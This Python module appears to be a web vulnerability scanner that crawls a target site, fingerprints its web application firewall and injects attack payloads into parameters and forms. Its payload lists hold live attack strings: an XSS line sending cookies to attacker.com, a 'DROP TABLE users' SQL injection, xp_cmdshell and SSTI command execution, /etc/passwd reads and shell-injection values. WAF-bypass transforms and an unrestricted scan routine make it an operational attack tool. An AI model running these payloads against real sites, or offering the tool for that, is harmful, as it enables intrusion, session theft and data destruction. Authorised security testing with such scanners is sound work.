"""
DRAKBEN - Web Application Security Scanner
XSS/SQLi detection, form analysis, WAF bypass, URL crawling
"""

import asyncio
import aiohttp
import re
import hashlib
import urllib.parse
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Set, Tuple, Any
from enum import Enum
from datetime import datetime


class VulnerabilityType(Enum):
    """Web vulnerability types"""
    XSS_REFLECTED = "xss_reflected"
    XSS_STORED = "xss_stored"
    XSS_DOM = "xss_dom"
    SQLI_ERROR = "sqli_error"
    SQLI_BLIND = "sqli_blind"
    SQLI_TIME = "sqli_time"
    LFI = "lfi"
    RFI = "rfi"
    SSRF = "ssrf"
    OPEN_REDIRECT = "open_redirect"
    CSRF = "csrf"
    IDOR = "idor"
    XXE = "xxe"
    SSTI = "ssti"
    COMMAND_INJECTION = "command_injection"


class WAFType(Enum):
    """Known WAF types"""
    CLOUDFLARE = "cloudflare"
    AWS_WAF = "aws_waf"
    AKAMAI = "akamai"
    IMPERVA = "imperva"
    F5_BIG_IP = "f5_big_ip"
    MODSECURITY = "modsecurity"
    SUCURI = "sucuri"
    BARRACUDA = "barracuda"
    FORTINET = "fortinet"
    UNKNOWN = "unknown"
    NONE = "none"


class Severity(Enum):
    """Vulnerability severity levels"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class FormField:
    """HTML form field"""
    name: str
    field_type: str
    value: str = ""
    required: bool = False
    
    def to_dict(self) -> Dict:
        return {
            "name": self.name,
            "type": self.field_type,
            "value": self.value,
            "required": self.required
        }


@dataclass
class HTMLForm:
    """HTML form structure"""
    action: str
    method: str
    fields: List[FormField] = field(default_factory=list)
    enctype: str = "application/x-www-form-urlencoded"
    
    def to_dict(self) -> Dict:
        return {
            "action": self.action,
            "method": self.method,
            "fields": [f.to_dict() for f in self.fields],
            "enctype": self.enctype
        }


@dataclass
class WebVulnerability:
    """Web vulnerability finding"""
    vuln_type: VulnerabilityType
    url: str
    parameter: str
    payload: str
    evidence: str
    severity: Severity
    description: str
    remediation: str
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    
    def to_dict(self) -> Dict:
        return {
            "type": self.vuln_type.value,
            "url": self.url,
            "parameter": self.parameter,
            "payload": self.payload,
            "evidence": self.evidence,
            "severity": self.severity.value,
            "description": self.description,
            "remediation": self.remediation,
            "timestamp": self.timestamp
        }


@dataclass
class CrawlResult:
    """URL crawling result"""
    url: str
    status_code: int
    content_type: str
    links: List[str] = field(default_factory=list)
    forms: List[HTMLForm] = field(default_factory=list)
    parameters: List[str] = field(default_factory=list)


class PayloadGenerator:
    """Generates attack payloads for various vulnerability types"""
    
    # XSS Payloads
    XSS_PAYLOADS = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '"><script>alert("XSS")</script>',
        "'-alert('XSS')-'",
        '<body onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\')">',
        '<input onfocus=alert("XSS") autofocus>',
        '<marquee onstart=alert("XSS")>',
        '<details open ontoggle=alert("XSS")>',
        '{{constructor.constructor("alert(1)")()}}',
        '${alert("XSS")}',
        '<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>',
    ]
    
    # SQLi Payloads
    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1; DROP TABLE users--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "' OR 1=1#",
        "admin'--",
        "1' WAITFOR DELAY '0:0:5'--",
        "1' AND SLEEP(5)--",
        "1'; EXEC xp_cmdshell('whoami')--",
    ]
    
    # SQLi Error Detection Patterns
    SQLI_ERROR_PATTERNS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySqlException",
        r"valid MySQL result",
        r"PostgreSQL.*ERROR",
        r"Warning.*pg_",
        r"ORA-[0-9]+",
        r"Oracle error",
        r"SQLite.*error",
        r"sqlite3\.OperationalError",
        r"Microsoft.*ODBC.*SQL Server",
        r"SQLSTATE\[",
        r"Unclosed quotation mark",
        r"quoted string not properly terminated",
    ]
    
    # LFI Payloads
    LFI_PAYLOADS = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "/etc/passwd%00",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "expect://id",
        "file:///etc/passwd",
        r"....\/....\/....\/etc/passwd",
    ]
    
    # Command Injection Payloads
    CMDI_PAYLOADS = [
        "; whoami",
        "| whoami",
        "|| whoami",
        "& whoami",
        "&& whoami",
        "`whoami`",
        "$(whoami)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; ping -c 3 127.0.0.1",
        "| ping -c 3 127.0.0.1",
    ]
    
    # SSTI Payloads
    SSTI_PAYLOADS = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config}}",
        "{{self.__class__.__mro__[1].__subclasses__()}}",
        "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    ]
    
    # Open Redirect Payloads
    REDIRECT_PAYLOADS = [
        "//evil.com",
        "https://evil.com",
        "//evil.com/%2f..",
        "/\\evil.com",
        "////evil.com",
        "https:evil.com",
        "http://evil.com",
        "//evil%E3%80%82com",
    ]


class WAFDetector:
    """Web Application Firewall detection"""
    
    # WAF signatures
    WAF_SIGNATURES = {
        WAFType.CLOUDFLARE: {
            "headers": ["cf-ray", "cf-cache-status", "__cfduid"],
            "cookies": ["__cfduid", "cf_clearance"],
            "body_patterns": ["cloudflare", "attention required"],
        },
        WAFType.AWS_WAF: {
            "headers": ["x-amzn-requestid", "x-amz-cf-id"],
            "cookies": ["awsalb", "awsalbcors"],
            "body_patterns": ["aws", "request blocked"],
        },
        WAFType.AKAMAI: {
            "headers": ["akamai-grn", "x-akamai-transformed"],
            "cookies": ["akamai"],
            "body_patterns": ["akamai", "access denied"],
        },
        WAFType.IMPERVA: {
            "headers": ["x-iinfo", "x-cdn"],
            "cookies": ["incap_ses", "visid_incap"],
            "body_patterns": ["incapsula", "imperva"],
        },
        WAFType.F5_BIG_IP: {
            "headers": ["x-wa-info", "x-cnection"],
            "cookies": ["bigipserver", "f5_cspm"],
            "body_patterns": ["f5", "request rejected"],
        },
        WAFType.MODSECURITY: {
            "headers": ["mod_security", "modsecurity"],
            "cookies": [],
            "body_patterns": ["modsecurity", "mod_security", "not acceptable"],
        },
        WAFType.SUCURI: {
            "headers": ["x-sucuri-id", "x-sucuri-cache"],
            "cookies": ["sucuri_cloudproxy"],
            "body_patterns": ["sucuri", "access denied"],
        },
        WAFType.FORTINET: {
            "headers": ["fortigate", "fortiwafc"],
            "cookies": ["fortigate", "fortiwafc"],
            "body_patterns": ["fortigate", "fortinet", "blocked"],
        },
    }
    
    # WAF bypass techniques
    BYPASS_TECHNIQUES = {
        "case_variation": lambda p: p.replace("script", "ScRiPt").replace("SCRIPT", "sCrIpT"),
        "null_byte": lambda p: p.replace("<", "%00<").replace(">", ">%00"),
        "unicode_encode": lambda p: "".join(f"\\u{ord(c):04x}" if c.isalpha() else c for c in p),
        "html_entities": lambda p: p.replace("<", "&lt;").replace(">", "&gt;"),
        "double_encode": lambda p: urllib.parse.quote(urllib.parse.quote(p)),
        "comment_injection": lambda p: p.replace("<script>", "<scr<!---->ipt>"),
        "whitespace": lambda p: p.replace(" ", "%09").replace("<", "%0a<"),
    }
    
    async def detect_waf(self, session: aiohttp.ClientSession, url: str) -> Tuple[WAFType, Dict]:
        """Detect WAF on target"""
        try:
            # Normal request
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                headers = dict(resp.headers)
                cookies = {c.key: c.value for c in resp.cookies.values()}
                body = await resp.text()
            
            # Malicious request to trigger WAF
            test_url = f"{url}?test=<script>alert(1)</script>"
            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as mal_resp:
                mal_body = await mal_resp.text()
                mal_status = mal_resp.status
            
            # Check signatures
            for waf_type, signatures in self.WAF_SIGNATURES.items():
                # Check headers
                for header in signatures["headers"]:
                    if header.lower() in [h.lower() for h in headers.keys()]:
                        return waf_type, {"detection": "header", "header": header}
                
                # Check cookies
                for cookie in signatures["cookies"]:
                    if cookie.lower() in [c.lower() for c in cookies.keys()]:
                        return waf_type, {"detection": "cookie", "cookie": cookie}
                
                # Check body patterns
                for pattern in signatures["body_patterns"]:
                    if pattern.lower() in mal_body.lower():
                        return waf_type, {"detection": "body", "pattern": pattern}
            
            # Check for generic WAF indicators
            if mal_status in [403, 406, 429, 503]:
                return WAFType.UNKNOWN, {"detection": "status_code", "status": mal_status}
            
            return WAFType.NONE, {"detection": "none"}
            
        except Exception as e:
            return WAFType.UNKNOWN, {"detection": "error", "error": str(e)}
    
    def get_bypass_payloads(self, original_payload: str, waf_type: WAFType) -> List[str]:
        """Generate WAF bypass payloads"""
        bypasses = [original_payload]
        
        for name, technique in self.BYPASS_TECHNIQUES.items():
            try:
                bypasses.append(technique(original_payload))
            except:
                pass
        
        return bypasses


class URLCrawler:
    """Web page crawler for discovering URLs and forms"""
    
    def __init__(self, max_depth: int = 3, max_pages: int = 100):
        self.max_depth = max_depth
        self.max_pages = max_pages
        self.visited: Set[str] = set()
        self.forms_found: List[HTMLForm] = []
        self.parameters_found: Set[str] = set()
    
    async def crawl(self, session: aiohttp.ClientSession, base_url: str) -> List[CrawlResult]:
        """Crawl website starting from base URL"""
        results = []
        queue = [(base_url, 0)]
        
        while queue and len(self.visited) < self.max_pages:
            url, depth = queue.pop(0)
            
            if url in self.visited or depth > self.max_depth:
                continue
            
            self.visited.add(url)
            
            try:
                result = await self._fetch_page(session, url)
                if result:
                    results.append(result)
                    
                    # Add new links to queue
                    for link in result.links:
                        if link not in self.visited:
                            queue.append((link, depth + 1))
                            
            except Exception:
                pass
        
        return results
    
    async def _fetch_page(self, session: aiohttp.ClientSession, url: str) -> Optional[CrawlResult]:
        """Fetch and parse a single page"""
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                if resp.status != 200:
                    return None
                
                content_type = resp.headers.get("Content-Type", "")
                if "text/html" not in content_type:
                    return None
                
                html = await resp.text()
                
                # Extract links
                links = self._extract_links(html, url)
                
                # Extract forms
                forms = self._extract_forms(html, url)
                
                # Extract parameters from URL
                params = self._extract_parameters(url)
                
                return CrawlResult(
                    url=url,
                    status_code=resp.status,
                    content_type=content_type,
                    links=links,
                    forms=forms,
                    parameters=params
                )
                
        except Exception:
            return None
    
    def _extract_links(self, html: str, base_url: str) -> List[str]:
        """Extract links from HTML"""
        links = []
        parsed_base = urllib.parse.urlparse(base_url)
        
        # Find href attributes
        href_pattern = r'href=["\']([^"\']+)["\']'
        for match in re.finditer(href_pattern, html, re.IGNORECASE):
            href = match.group(1)
            
            # Skip anchors and javascript
            if href.startswith("#") or href.startswith("javascript:"):
                continue
            
            # Make absolute URL
            absolute_url = urllib.parse.urljoin(base_url, href)
            parsed_url = urllib.parse.urlparse(absolute_url)
            
            # Only include same domain
            if parsed_url.netloc == parsed_base.netloc:
                links.append(absolute_url)
        
        return list(set(links))
    
    def _extract_forms(self, html: str, base_url: str) -> List[HTMLForm]:
        """Extract forms from HTML"""
        forms = []
        
        # Simple form pattern
        form_pattern = r'<form[^>]*>(.*?)</form>'
        
        for form_match in re.finditer(form_pattern, html, re.DOTALL | re.IGNORECASE):
            form_html = form_match.group(0)
            
            # Get action
            action_match = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
            action = action_match.group(1) if action_match else ""
            action = urllib.parse.urljoin(base_url, action)
            
            # Get method
            method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
            method = method_match.group(1).upper() if method_match else "GET"
            
            # Get fields
            fields = []
            input_pattern = r'<input[^>]*>'
            for input_match in re.finditer(input_pattern, form_html, re.IGNORECASE):
                input_html = input_match.group(0)
                
                name_match = re.search(r'name=["\']([^"\']*)["\']', input_html, re.IGNORECASE)
                type_match = re.search(r'type=["\']([^"\']*)["\']', input_html, re.IGNORECASE)
                value_match = re.search(r'value=["\']([^"\']*)["\']', input_html, re.IGNORECASE)
                
                if name_match:
                    fields.append(FormField(
                        name=name_match.group(1),
                        field_type=type_match.group(1) if type_match else "text",
                        value=value_match.group(1) if value_match else "",
                        required="required" in input_html.lower()
                    ))
            
            # Get textarea fields
            textarea_pattern = r'<textarea[^>]*name=["\']([^"\']*)["\'][^>]*>'
            for ta_match in re.finditer(textarea_pattern, form_html, re.IGNORECASE):
                fields.append(FormField(
                    name=ta_match.group(1),
                    field_type="textarea",
                    value="",
                    required=False
                ))
            
            if fields:
                forms.append(HTMLForm(
                    action=action,
                    method=method,
                    fields=fields
                ))
        
        return forms
    
    def _extract_parameters(self, url: str) -> List[str]:
        """Extract query parameters from URL"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        return list(params.keys())


class VulnerabilityScanner:
    """Scans for web vulnerabilities"""
    
    def __init__(self):
        self.payloads = PayloadGenerator()
        self.vulnerabilities: List[WebVulnerability] = []
    
    async def scan_xss(self, session: aiohttp.ClientSession, url: str, 
                       parameter: str, method: str = "GET") -> List[WebVulnerability]:
        """Scan for XSS vulnerabilities"""
        vulns = []
        
        for payload in self.payloads.XSS_PAYLOADS[:5]:  # Limit for speed
            try:
                if method == "GET":
                    test_url = self._inject_parameter(url, parameter, payload)
                    async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        body = await resp.text()
                else:
                    data = {parameter: payload}
                    async with session.post(url, data=data, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        body = await resp.text()
                
                # Check if payload reflected
                if payload in body or payload.replace('"', '&quot;') in body:
                    vulns.append(WebVulnerability(
                        vuln_type=VulnerabilityType.XSS_REFLECTED,
                        url=url,
                        parameter=parameter,
                        payload=payload,
                        evidence=f"Payload reflected in response",
                        severity=Severity.HIGH,
                        description="Reflected Cross-Site Scripting (XSS) vulnerability detected",
                        remediation="Encode all user input before reflecting in HTML context"
                    ))
                    break  # Found XSS, no need to continue
                    
            except Exception:
                pass
        
        return vulns
    
    async def scan_sqli(self, session: aiohttp.ClientSession, url: str,
                        parameter: str, method: str = "GET") -> List[WebVulnerability]:
        """Scan for SQL injection vulnerabilities"""
        vulns = []
        
        for payload in self.payloads.SQLI_PAYLOADS[:5]:  # Limit for speed
            try:
                if method == "GET":
                    test_url = self._inject_parameter(url, parameter, payload)
                    async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        body = await resp.text()
                else:
                    data = {parameter: payload}
                    async with session.post(url, data=data, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        body = await resp.text()
                
                # Check for SQL error patterns
                for pattern in self.payloads.SQLI_ERROR_PATTERNS:
                    if re.search(pattern, body, re.IGNORECASE):
                        vulns.append(WebVulnerability(
                            vuln_type=VulnerabilityType.SQLI_ERROR,
                            url=url,
                            parameter=parameter,
                            payload=payload,
                            evidence=f"SQL error pattern matched: {pattern}",
                            severity=Severity.CRITICAL,
                            description="Error-based SQL Injection vulnerability detected",
                            remediation="Use parameterized queries and prepared statements"
                        ))
                        return vulns  # Found SQLi, return immediately
                        
            except Exception:
                pass
        
        # Time-based blind SQLi test
        try:
            time_payload = "1' AND SLEEP(3)--"
            start = datetime.now()
            
            if method == "GET":
                test_url = self._inject_parameter(url, parameter, time_payload)
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    await resp.text()
            
            elapsed = (datetime.now() - start).total_seconds()
            
            if elapsed >= 3:
                vulns.append(WebVulnerability(
                    vuln_type=VulnerabilityType.SQLI_TIME,
                    url=url,
                    parameter=parameter,
                    payload=time_payload,
                    evidence=f"Response delayed by {elapsed:.2f} seconds",
                    severity=Severity.CRITICAL,
                    description="Time-based Blind SQL Injection vulnerability detected",
                    remediation="Use parameterized queries and prepared statements"
                ))
                
        except Exception:
            pass
        
        return vulns
    
    async def scan_lfi(self, session: aiohttp.ClientSession, url: str,
                       parameter: str) -> List[WebVulnerability]:
        """Scan for Local File Inclusion vulnerabilities"""
        vulns = []
        
        for payload in self.payloads.LFI_PAYLOADS[:5]:
            try:
                test_url = self._inject_parameter(url, parameter, payload)
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    body = await resp.text()
                
                # Check for /etc/passwd content
                if "root:" in body and "/bin/" in body:
                    vulns.append(WebVulnerability(
                        vuln_type=VulnerabilityType.LFI,
                        url=url,
                        parameter=parameter,
                        payload=payload,
                        evidence="File contents leaked (/etc/passwd)",
                        severity=Severity.CRITICAL,
                        description="Local File Inclusion vulnerability detected",
                        remediation="Validate and sanitize file paths, use whitelisting"
                    ))
                    break
                    
            except Exception:
                pass
        
        return vulns
    
    async def scan_cmdi(self, session: aiohttp.ClientSession, url: str,
                        parameter: str) -> List[WebVulnerability]:
        """Scan for Command Injection vulnerabilities"""
        vulns = []
        
        for payload in self.payloads.CMDI_PAYLOADS[:5]:
            try:
                test_url = self._inject_parameter(url, parameter, payload)
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    body = await resp.text()
                
                # Check for command output
                if "root:" in body or "uid=" in body or "PING" in body.upper():
                    vulns.append(WebVulnerability(
                        vuln_type=VulnerabilityType.COMMAND_INJECTION,
                        url=url,
                        parameter=parameter,
                        payload=payload,
                        evidence="Command output detected in response",
                        severity=Severity.CRITICAL,
                        description="OS Command Injection vulnerability detected",
                        remediation="Avoid system commands, use parameterized APIs"
                    ))
                    break
                    
            except Exception:
                pass
        
        return vulns
    
    def _inject_parameter(self, url: str, parameter: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        params[parameter] = [payload]
        
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))


class WebApplicationScanner:
    """Main web application security scanner"""
    
    def __init__(self):
        self.crawler = URLCrawler()
        self.waf_detector = WAFDetector()
        self.vuln_scanner = VulnerabilityScanner()
        self.results: Dict[str, Any] = {}
    
    async def scan(self, target_url: str, options: Optional[Dict] = None) -> Dict:
        """Perform full web application scan"""
        options = options or {}
        
        self.results = {
            "target": target_url,
            "scan_start": datetime.now().isoformat(),
            "waf": None,
            "pages_crawled": 0,
            "forms_found": 0,
            "parameters_found": 0,
            "vulnerabilities": [],
            "scan_end": None
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        
        async with aiohttp.ClientSession(headers=headers) as session:
            # 1. WAF Detection
            waf_type, waf_info = await self.waf_detector.detect_waf(session, target_url)
            self.results["waf"] = {
                "type": waf_type.value,
                "info": waf_info
            }
            
            # 2. Crawl website
            crawl_results = await self.crawler.crawl(session, target_url)
            self.results["pages_crawled"] = len(crawl_results)
            
            # Collect all forms and parameters
            all_forms = []
            all_params = set()
            
            for result in crawl_results:
                all_forms.extend(result.forms)
                all_params.update(result.parameters)
            
            self.results["forms_found"] = len(all_forms)
            self.results["parameters_found"] = len(all_params)
            
            # 3. Scan for vulnerabilities
            vulnerabilities = []
            
            # Scan URL parameters
            for result in crawl_results:
                for param in result.parameters:
                    # XSS scan
                    xss_vulns = await self.vuln_scanner.scan_xss(
                        session, result.url, param, "GET"
                    )
                    vulnerabilities.extend(xss_vulns)
                    
                    # SQLi scan
                    sqli_vulns = await self.vuln_scanner.scan_sqli(
                        session, result.url, param, "GET"
                    )
                    vulnerabilities.extend(sqli_vulns)
                    
                    # LFI scan
                    lfi_vulns = await self.vuln_scanner.scan_lfi(
                        session, result.url, param
                    )
                    vulnerabilities.extend(lfi_vulns)
            
            # Scan forms
            for form in all_forms:
                for field in form.fields:
                    if field.field_type in ["text", "search", "textarea", "hidden"]:
                        # XSS scan
                        xss_vulns = await self.vuln_scanner.scan_xss(
                            session, form.action, field.name, form.method
                        )
                        vulnerabilities.extend(xss_vulns)
                        
                        # SQLi scan
                        sqli_vulns = await self.vuln_scanner.scan_sqli(
                            session, form.action, field.name, form.method
                        )
                        vulnerabilities.extend(sqli_vulns)
            
            self.results["vulnerabilities"] = [v.to_dict() for v in vulnerabilities]
        
        self.results["scan_end"] = datetime.now().isoformat()
        return self.results
    
    def get_summary(self) -> Dict:
        """Get scan summary"""
        if not self.results:
            return {}
        
        vuln_counts = {}
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        
        for vuln in self.results.get("vulnerabilities", []):
            vtype = vuln["type"]
            vuln_counts[vtype] = vuln_counts.get(vtype, 0) + 1
            severity_counts[vuln["severity"]] += 1
        
        return {
            "target": self.results.get("target"),
            "waf_detected": self.results.get("waf", {}).get("type", "unknown"),
            "pages_crawled": self.results.get("pages_crawled", 0),
            "forms_found": self.results.get("forms_found", 0),
            "total_vulnerabilities": len(self.results.get("vulnerabilities", [])),
            "vulnerability_types": vuln_counts,
            "severity_breakdown": severity_counts
        }


# Global scanner instance
_scanner: Optional[WebApplicationScanner] = None


def get_scanner() -> WebApplicationScanner:
    """Get global scanner instance"""
    global _scanner
    if _scanner is None:
        _scanner = WebApplicationScanner()
    return _scanner


async def quick_scan(url: str) -> Dict:
    """Quick scan a URL for common vulnerabilities"""
    scanner = get_scanner()
    return await scanner.scan(url)
